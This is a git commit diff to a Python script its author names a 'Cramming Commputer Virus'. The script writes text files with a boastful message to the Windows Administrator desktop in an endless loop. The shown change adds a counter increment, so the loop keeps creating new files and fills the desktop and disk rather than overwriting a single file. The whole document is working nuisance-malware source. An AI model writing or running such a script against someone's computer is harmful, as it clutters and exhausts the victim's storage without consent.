0a4f88158049a48bc6c2c4705b3e3408a846fe5f
PengPeng3g <69892417+PengPeng3g@users.noreply.github.com>
2020-08-30 11:21:11 +0800

    Update Cramming Commputer Virus_v1.0.py

--- Cramming Commputer Virus_v1.0.py
+++ Cramming Commputer Virus_v1.0.py
@@ -8,3 +8,4 @@ Nummber = 0
 while True:
     with open('C:\\Users\Administrator\Desktop\PengPeng3g is a handsome guy!!!%d.txt'%(Nummber),mode = 'w',encoding = 'utf-8') as file:
         file.write('PengPeng3g is a handsome guy!!!')
+        Nummber = Nummber + 1
